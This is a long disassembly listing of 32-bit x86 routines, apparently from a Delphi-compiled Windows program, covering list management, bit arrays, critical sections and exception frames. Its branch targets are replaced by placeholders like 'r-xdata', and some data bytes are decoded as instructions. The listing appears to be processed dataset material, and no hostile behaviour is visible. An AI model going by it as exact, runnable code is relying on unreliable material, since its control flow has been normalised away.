mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_4030bc
push eax
mov eax esi
call sub_4030bc
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_4192e4
push eax
mov eax esi
call sub_4192e4
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418119
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_417fa0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4180fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_417fa0
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407d40
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418103
mov eax [ ebp - 0xc ]
call sub_403174
retn
mov al 0x1
sub_41812c
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_41814c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418198
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418234
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028f0
mov edx esi
mov eax ebx
call sub_4182a8
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4181fc
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4181f8
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
jmp sub_403928
sub_418234
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41827c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405c1c
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4181fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418283
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_4182a8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418234
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4182d0
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_418464
retn
sub_418304
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_418324
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418234
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028f0
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41839c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418234
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4182a8
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_418198
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418324
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_4183f4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418234
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418444
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_418304
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418198
sub_418464
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418234
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_402734
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_4184a0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418234
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_418464
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b80
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_418198
dec ebp
inc edi
jne r-xdata
sub_418514
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
mov edi eax
push 0x0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_418514
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
jmp [ eax * 4 + jump_table_418554 ]
xor eax eax
mov al bl
cmp eax 0x5
ja r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ edi + 0xc ]
mov eax esi
call sub_418464
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41870e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_418464
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4187ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_418464
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax esi
call sub_4182a8
mov edx eax
mov eax edi
call sub_418304
inc eax
jne r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax esi
call sub_4182a8
mov edx eax
mov eax edi
call sub_418304
inc eax
je r-xdata
push 0x0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_418514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403174
retn
mov edx ebx
mov eax edi
call sub_4182a8
mov edx eax
mov eax esi
call sub_418304
inc eax
jne r-xdata
mov edx ebx
mov eax edi
call sub_4182a8
mov edx eax
mov eax esi
call sub_41814c
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
jmp r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_418198
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4182a8
mov edx eax
mov eax esi
call sub_41814c
mov ebx [ esi + 0x8 ]
mov eax [ ebp - 0x8 ]
add ebx [ eax + 0x8 ]
cmp ebx [ esi + 0xc ]
jle r-xdata
mov edx ebx
mov eax esi
call sub_4182a8
mov edx eax
mov eax edi
call sub_418304
inc eax
je r-xdata
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4182a8
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_41814c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_418198
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4182a8
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_41814c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4182a8
mov edx eax
mov eax esi
call sub_418304
inc eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx ebx
mov eax esi
call sub_418464
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_418198
mov edx ebx
mov eax edi
call sub_4182a8
mov edx eax
mov eax esi
call sub_418304
inc eax
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403174
retn
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4182a8
mov edx eax
mov eax esi
call sub_41814c
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
sub_4187e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_418834
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403528
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418938
xor eax eax
push ebp
push sub_418896
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403174
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41889d
mov eax [ ebp - 0x4 ]
call sub_41899c
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_4188b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418938
xor eax eax
push ebp
push sub_41892c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41814c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418304
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418933
mov eax [ ebp - 0x4 ]
call sub_41899c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_418234
sub_41894c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418938
xor eax eax
push ebp
push sub_41898f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418444
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418996
mov eax [ ebp - 0x4 ]
call sub_41899c
retn
sub_4189a8
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4189fc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_4189fc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_4189d8
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026f4
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b80
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402714
mov edx edi
mov eax ebp
call sub_4189f0
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028f0
sub_418aa0
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_4189d8
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_4189fc
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418acc
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_418b44
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_41bb44
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_418b84
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418c3a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f84
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030c4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404150
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030c4
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c41
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_418c60
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418cf5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4030c4
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404150
mov eax ebx
mov si 0xffff
call sub_403370
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cfc
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax ebx
mov si 0xffff
call sub_403370
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403370
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_40426c
sub_418d07
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4033b0
mov eax ebx
mov si 0xffff
call sub_403370
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403370
push eax
lea eax [ ebx + 0x4 ]
call sub_405758
mov ecx eax
mov edx r-xdata
pop eax
call sub_403228
sub_418d52
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418da4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403228
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_418dcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405758
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403370
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax edi
call sub_405758
mov edx eax
mov eax esi
call sub_418dcc
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405758
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_418e64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_418eb9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405758
mov edx eax
mov eax edi
call sub_418dcc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ec0
lea eax [ ebp - 0x4 ]
call sub_405758
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_418ec8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_418f00
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b44
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_418f30
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_418f6c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030c4
mov edx esp
mov eax esi
call sub_404150
add esp 0x100
pop esi
pop ebx
retn
sub_418f94
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419029
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4030c4
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_404150
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403370
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_418f54
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408c7c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419030
lea eax [ ebp - 0x14 ]
call sub_403eec
retn
sub_41904c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_41954c
mov edx ebx
mov eax esi
call sub_4194e4
sub_41907c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_418f54
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_41839c
mov dl 0x1
mov eax ebx
call sub_418f30
sub_4190ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_418e64
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4190f8
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_418e64
mov eax [ esi + 0x8 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b44
test bl bl
jle r-xdata
mov eax esi
call sub_419210
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_419144
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_419164
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418b70
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4191e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419210
mov eax esi
call sub_4192e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_4192ec
push eax
mov eax [ ebp - 0x4 ]
call sub_419144
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_419210
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41926a
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_418390
call sub_403174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_419284
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
